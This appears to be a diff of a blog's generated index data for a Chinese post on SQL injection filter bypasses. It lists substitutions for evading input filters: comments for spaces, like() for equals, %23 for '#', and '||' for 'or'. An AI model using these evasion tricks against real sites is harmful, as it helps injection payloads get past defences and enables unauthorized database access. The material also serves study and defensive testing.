-    <content><![CDATA[<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p>空格 &#x3D;&gt; &#x2F;**&#x2F;<br>等号 &#x3D;&gt; like()<br>“#”  &#x3D;&gt; %23</p>
+    <url>/2023/06/28/SQL%E6%B3%A8%E5%85%A5/%E8%BF%87%E6%BB%A4%E5%BA%94%E5%AF%B9/</url>
+    <content><![CDATA[<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p>空格 &#x3D;&gt; &#x2F;**&#x2F;  </p>
+<p>等号 &#x3D;&gt; like()</p>
+<p><code>#</code> &#x3D;&gt; %23</p>
+<p>or &#x3D;&gt; ||</p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
